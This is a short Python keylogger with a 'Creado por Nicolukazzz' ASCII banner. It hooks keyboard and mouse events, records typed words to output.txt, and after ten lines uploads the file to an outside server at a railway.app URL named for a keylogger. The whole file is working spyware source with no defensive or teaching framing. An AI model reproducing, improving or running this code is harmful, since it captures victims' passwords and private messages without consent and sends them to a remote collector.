'''
 ▄████▄   ██▀███  ▓█████ ▄▄▄      ▓█████▄  ▒█████      ██▓███   ▒█████   ██▀███              
▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▒██▒  ██▒   ▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒            
▒▓█    ▄ ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ░██   █▌▒██░  ██▒   ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒            
▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░   ▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄              
▒ ▓███▀ ░░██▓ ▒██▒░▒████▒▓█   ▓██▒░▒████▓ ░ ████▓▒░   ▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒            
░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░            
  ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░    ░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░            
░          ░░   ░    ░    ░   ▒    ░ ░  ░ ░ ░ ░ ▒     ░░       ░ ░ ░ ▒    ░░   ░             
░ ░         ░        ░  ░     ░  ░   ░        ░ ░                  ░ ░     ░                 
░                                  ░                                                         
 ███▄    █  ██▓ ▄████▄   ▒█████   ██▓     █    ██  ██ ▄█▀▄▄▄      ▒███████▒▒███████▒▒███████▒
 ██ ▀█   █ ▓██▒▒██▀ ▀█  ▒██▒  ██▒▓██▒     ██  ▓██▒ ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░
▓██  ▀█ ██▒▒██▒▒▓█    ▄ ▒██░  ██▒▒██░    ▓██  ▒██░▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ 
▓██▒  ▐▌██▒░██░▒▓▓▄ ▄██▒▒██   ██░▒██░    ▓▓█  ░██░▓██ █▄░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ▄▀▒   ░
▒██░   ▓██░░██░▒ ▓███▀ ░░ ████▓▒░░██████▒▒▒█████▓ ▒██▒ █▄▓█   ▓██▒▒███████▒▒███████▒▒███████▒
░ ▒░   ▒ ▒ ░▓  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒
░ ░░   ░ ▒░ ▒ ░  ░  ▒     ░ ▒ ▒░ ░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒ ▒░ ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒
   ░   ░ ░  ▒ ░░        ░ ░ ░ ▒    ░ ░    ░░░ ░ ░ ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░░ ░ ░ ░ ░
         ░  ░  ░ ░          ░ ░      ░  ░   ░     ░  ░        ░  ░  ░ ░      ░ ░      ░ ░    
               ░                                                  ░        ░        ░        
'''

import keyboard
import mouse
import requests

palabra = ""

def key(pulso):
    global palabra
    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":            
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
            palabra += pulso.name


def on_click(click):
    if isinstance(click, mouse.ButtonEvent):
        if click.event_type == "down":  # Detecta cuando el botón se presiona
            print("click")
            save_word()
    
    

keyboard.hook(key)
mouse.hook(on_click)

def save_word():        
    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
        
    print(palabra + "\n")
    
    with open("output.txt", "r") as file:
        line_count = sum(1 for line in file)
        
    
    if line_count > 10:
        send_server("output.txt")
    reset()  
    

def send_server(filename):
    url = "https://keylogger-production.up.railway.app/upload"
    with open(filename, "rb") as file:
        try:
            response = requests.post(url, files={"file": file})
            print(f"Respuesta del servidor: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Error al enviar el archivo: {e}")
    
    
def reset():
    global palabra
    palabra = ""

try:
    keyboard.wait("esc")
except KeyboardInterrupt:
    print("Script detenido")
    pass
finally:
    keyboard.unhook_all()
    mouse.unhook_all()
